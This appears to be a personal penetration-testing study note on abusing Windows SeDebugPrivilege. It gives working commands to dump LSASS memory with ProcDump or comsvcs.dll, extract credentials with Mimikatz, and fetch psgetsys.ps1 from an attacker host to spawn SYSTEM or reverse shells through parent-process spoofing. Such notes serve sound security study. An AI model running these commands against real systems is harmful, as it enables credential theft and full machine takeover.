---
created: 2026-02-10
tags:
  - Windows
  - Windows_PrivEsc
status: draft
---
![[🛠️ Windows privileges#`SeDebugPrivilege`]]

## Extracting credentials from LSASS memory

- The most immediate use of `SeDebugPrivilege` is dumping `lsass.exe` memory to extract credentials.
- First, you need to same the LSASS memory dump into a file, and then extract credentials from it using Mimikatz.

>[!note] See [[🛠️ Dumping LSASS memory]].
### Saving LSASS memory dump

- Using [`ProcDump`](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) (from the Sysinternals Suite):

```powershell
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

>[!tip]+ To save command output to a file, type `log` in the Mimikatz console before dumping credentials.
>```powershell
>mimikatz # log
>Using 'mimikatz.log' for logfile : OK
>```

>[!tip]+ If the debug privilege (`SeDebugPrivilege`) is disabled (but you have it), request it using `privilege::debug`:
>```powershell
>mimikatz # privilege::debug
>```

- Using built-in `comsvc.dll`:

```powershell
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full
```

- Alternatively, go to `Task Manager` -> `Details` tab -> find and right-click the `lsass.exe` process -> `Create dump file`.
### Extracting credentials 

- Once you have the dump, you can load it in Mimikatz using `sekurlsa::minidump`:

```bash
mimikatz # sekurlsa::minidump lsass.dmp
```

- And then extract credentials using `sekurlsa::logonpasswords`:

```powershell
mimikatz # sekurlsa::logonpasswords
```

## RCE as SYSTEM via parent process spoofing

- `SeDebugPrivilege` can be used to achieve RCE as `SYSTEM` using a technique called **parent process spoofing**.

>[!note] See [`Getting SYSTEM — Decoder's Blog`](https://decoder.cloud/2018/02/02/getting-system/).

### Parent process spoofing

>**Parent Process ID (PPID) spoofing** allows a process to specify an **arbitrary parent process ID** during process creation. 

>[!note] PPID proofing is a legitimate technique introduced in Vista.

- Normally, a [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) inherits the **token of the calling process**.
- With PPID spoofing, a child process can inherit the **token of a specified parent process**. If the chosen [parent process](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) runs as `SYSTEM`, the child process will also run as `SYSTEM`.
---
- To set a parent process, you must first obtain a handle to it with sufficient rights (e.g., `PROCESS_CREATE_PROCESS`). 
- `SeDebugPrivilege` allows you to open handles to **any process**, including those running as `SYSTEM`. Without it, `OpenProcess()` fails.
---
- Attack chain:
	1. You have `SeDebugPrivilege`.
	2. Identify a `SYSTEM` process (e.g., `lsass.exe`, `services.exe`, `winlogon.exe`).
	3. Open a handle to that process.
	4. Call `CreateProcess()` with the target as the **parent**.
	5. The child process inherits the `SYSTEM` token.
	6. Execute `cmd.exe` or a payload -> obtain a **`SYSTEM` shell**.

### Exploitation

1. Download the [`psgetsys.ps1`](https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1) exploit and transfer it to the target system:

```bash
wget https://raw.githubusercontent.com/decoder-it/psgetsystem/refs/heads/master/psgetsys.ps1 && \
python -m http.server 8000
```

```bash
(New-Object Net.WebClient).DownloadFile("http://<attacker_ip_address>:8000/psgetsys.ps1", "psgetsys.ps1")
```

2. Identify a `SYSTEM` process and find its ID:

```powershell
tasklist
```

```powershell
Get-Process "lsass"
```

>[!note]+ Common choices
> 
> | Process        | Notes                                      |
> | -------------- | ------------------------------------------ |
> | `lsass.exe`    | Always `SYSTEM`, always present.           |
> | `services.exe` | Always `SYSTEM`, stable and safe target.   |
> | `winlogon.exe` | `SYSTEM`, session-bound.                   |
> | `svchost.exe`  | Usually `SYSTEM`, runs multiple instances. |

> [!example]-
> ```powershell
> tasklist
> ```
> ```powershell
> Image Name                     PID Session Name        Session#    Mem Usage   
> ========================= ======== ================ =========== ============   
> System Idle Process              0 Services                   0          4 K   
> System                           4 Services                   0        136 K   
> smss.exe                       336 Services                   0      1,244 K   
> csrss.exe                      444 Services                   0      4,760 K   
> wininit.exe                    552 Services                   0      5,232 K   
> csrss.exe                      560 Console                    1      5,900 K   
> winlogon.exe                   616 Console                    1     10,416 K   
> services.exe                   688 Services                   0      8,540 K   
> lsass.exe                      704 Services                   0     15,984 K   
> svchost.exe                    792 Services                   0     21,672 K   
> svchost.exe                    840 Services                   0     11,488 K   
> <SNIP> ...
> ```
> 
> ```
> lsass.exe                      704 Services                   0     15,984 K

>[!note] See [`Get-Process`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.6&viewFallbackFrom=powershell-7.2).

3. Run the exploit to spawn a `SYSTEM` process:

```powershell
. .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent(<PID>, "C:\Windows\System32\cmd.exe", "")
```
- Or, dynamically:
```powershell
. .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent((Get-Process lsass).Id, "C:\Windows\System32\cmd.exe", "")
```

- For a reverse shell instead:

```powershell
. .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent((Get-Process lsass).Id, "C:\Windows\Temp\shell.exe", "")
```

>[!note] The third argument specifies the working directory. Prefer absolute paths (e.g., `C:\Windows\Temp`) for reliability.

>[!interesting]+ Why this works?
> - Normally, a process can't create a child with higher privileges than itself.
> - However, when you set `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`, the kernel doesn't validate whether the caller has rights to inherit the target's token; it just does.
> - This is only possible because `SeDebugPrivilege` lets you open a handle to the `SYSTEM` process with the required access rights (`PROCESS_CREATE_PROCESS`) in the first place. 
> ---
>This is fundamentally different from token impersonation attacks — you are not _borrowing_ a token (`SeImpersonatePrivilege`); you are creating a **new process that natively runs as `SYSTEM`**.

## References and further reading

- [`Debug programs — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/debug-programs)
- [`Getting SYSTEM — Decoder's Blog`](https://decoder.cloud/2018/02/02/getting-system/)
- [`Child Processes — Mi. .\psgetsys.ps1crosoft Learn`](https://learn.microsoft.com/en-us/windows/win32/procthread/child-processes)
- [`SeDebugPrivilege — OSCP-CPTS NOTES`](https://notes.dollarboysushil.com/windows-privilege-escalation/user-privileges/sedebugprivilege)
- [`Parent Process ID (PPID) Spoofing — Red Team Notes`](https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing)

## drafts

> **LSASS (Local Security Authority Subsystem Service)** is a core Windows process (`lsass.exe`) responsible for authentication, enforcing security policies, and caching sensitive credential material in memory (e.g., NTLM hashes, Kerberos tickets, and sometimes plaintext passwords).

- Since `lsass.exe` runs as `SYSTEM` and contains highly sensitive data, the ability to open a handle to it, which is possible with `SeDebugPrivilege`, effectively grants access to those credentials.
